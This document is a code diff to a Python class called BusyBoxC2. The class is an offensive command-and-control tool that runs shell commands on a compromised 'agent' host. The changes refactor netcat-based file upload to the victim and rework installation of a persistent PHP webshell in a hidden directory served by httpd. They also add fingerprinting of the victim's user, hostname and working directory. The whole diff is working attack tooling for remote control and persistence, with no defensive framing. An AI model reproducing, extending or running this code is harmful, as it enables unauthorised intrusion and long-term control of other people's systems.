@@ -43,7 +43,7 @@ class BusyBoxC2:
         self.socket.setblocking(False)
         return self.socket
 
-    def _send_cmd(self, cmd):
+    def _send_cmd(self, cmd, output=True):
 
         # Add marker to know when command execution is terminated
         marker = "M{}".format(int(time.time()*1000))
@@ -70,19 +70,19 @@ class BusyBoxC2:
                 except BlockingIOError:
                     continue
                 if not chunk:
-                    if printed < len(buf):
+                    if printed < len(buf) and output==True:
                         sys.stdout.write(buf[printed:].decode(errors="replace"))
                         sys.stdout.flush()
                     return [bytes(buf)]
                 buf.extend(chunk)
                 idx = buf.find(marker_b)
                 if idx != -1:
-                    if printed < idx:
+                    if printed < idx and output==True:
                         sys.stdout.write(buf[printed:idx].decode(errors="replace"))
                         sys.stdout.flush()
                     return [bytes(buf)]
                 else:
-                    if len(buf) > printed:
+                    if len(buf) > printed and output==True:
                         sys.stdout.write(buf[printed:].decode(errors="replace"))
                         sys.stdout.flush()
                         printed = len(buf)
@@ -130,43 +130,35 @@ class BusyBoxC2:
 
         return listening_port, t
     
-    def _upload(self):
-        file_name = input("File to upload: ")
+    def _upload(self, file=0, destination_path="./"):
+        if file==0: file = input("File to upload: ")
+
+        file_path = os.path.dirname(file) + "/"
+        file_name = os.path.basename(file)
+
         listening_port = random.randint(1024, 65534)
-        remote_cmd = "nc -lp " + str(listening_port) + " > " + file_name
+        remote_cmd = "nc -lp " + str(listening_port) + " > " + destination_path + file_name
         t = threading.Thread(target=self._send_cmd, args=(remote_cmd,))
         t.start()
-        local_cmd = "sleep 0.2; busybox nc " + self.server_ip + " " + str(listening_port) + " < " + file_name
+        local_cmd = "sleep 0.2; busybox nc " + self.server_ip + " " + str(listening_port) + " < " + file_path + file_name
         os.system(local_cmd)
 
     
     def _install_webshell(self):
 
-        ### ToDo : Upload a tar archive and extract it to preserve execution rights on files.
-
-
         # Webshell destination path
         webshell_destination_path = "/run/user/$(id -u)/.http/"
 
-        # Create web directory on remote
+        # Create web directory on agent
         cmd = "mkdir -p " + webshell_destination_path
         self._send_cmd(cmd)
 
-        # Upload all ressources on remote
-        webshell_ressources_path = "./ressources/webshell/"
-        webshell_files = ["httpd.conf", "index.php", "php-cgi", "php-wrapper"]
-        for file in webshell_files:
-            listening_port = random.randint(1024, 65534)
-            remote_cmd = "nc -lp " + str(listening_port) + " > " + webshell_destination_path + file
-            #print("Remote cmd: " + remote_cmd)
-            t = threading.Thread(target=self._send_cmd, args=(remote_cmd,))
-            t.start()
-            local_cmd = "sleep 0.2; busybox nc " + self.server_ip + " " + str(listening_port) + " < " + webshell_ressources_path + file
-            #print("Local cmd: " + local_cmd)
-            os.system(local_cmd)
+        # Upload archive with ressources
+        self._upload("ressources/webshell.tar.gz", webshell_destination_path)
 
-        # Chmod necessary files (to remove)
-        cmd = "chmod +x " + webshell_destination_path + "php-*"
+        # Extract archive on agent
+        cmd = "cd " + webshell_destination_path + " && tar xzf webshell.tar.gz" + " && rm " + "webshell.tar.gz && cd -"
+        print("Executed cmd:" + cmd)
         self._send_cmd(cmd)
     
         # Run webserver
@@ -174,6 +166,15 @@ class BusyBoxC2:
         cmd = "httpd -p " + str(webserver_port) + " -c " + webshell_destination_path + "httpd.conf -h " + webshell_destination_path
         self._send_cmd(cmd)
         print(f"[*] Your webshell is ready on http://{self.server_ip}:{webserver_port}/index.php")
+
+    def _load_prompt(self):
+        agent_user = self._send_cmd("echo $USER", output=False)[0].decode().split("\n", 1)[0]
+        agent_hostname = self._send_cmd("hostname", output=False)[0].decode().split("\n", 1)[0]
+        agent_pwd = self._send_cmd("echo $PWD", output=False)[0].decode().split("\n", 1)[0]
+
+        #print(f"user: {agent_user} | hostname: {agent_hostname} | pwd: {agent_pwd}")
+
+        self.prompt = " (busybox-c2)[+] " + agent_user +  "@" + agent_hostname + ":" + agent_pwd + ">"
 
     def run(self):
         try:
@@ -205,9 +206,12 @@ class BusyBoxC2:
                         case '/persistence_webshell':
                             # work only without obfuscation
                             self._install_webshell()
-                            pass
+                        case '/load_prompt':
+                            self.options.append('load_prompt')
+                            self._load_prompt()
                         case _:
                             self._send_cmd(cmd)
+                            if "load_prompt" in self.options: self._load_prompt()
                 except (EOFError, KeyboardInterrupt):
                     break
                 if not cmd:
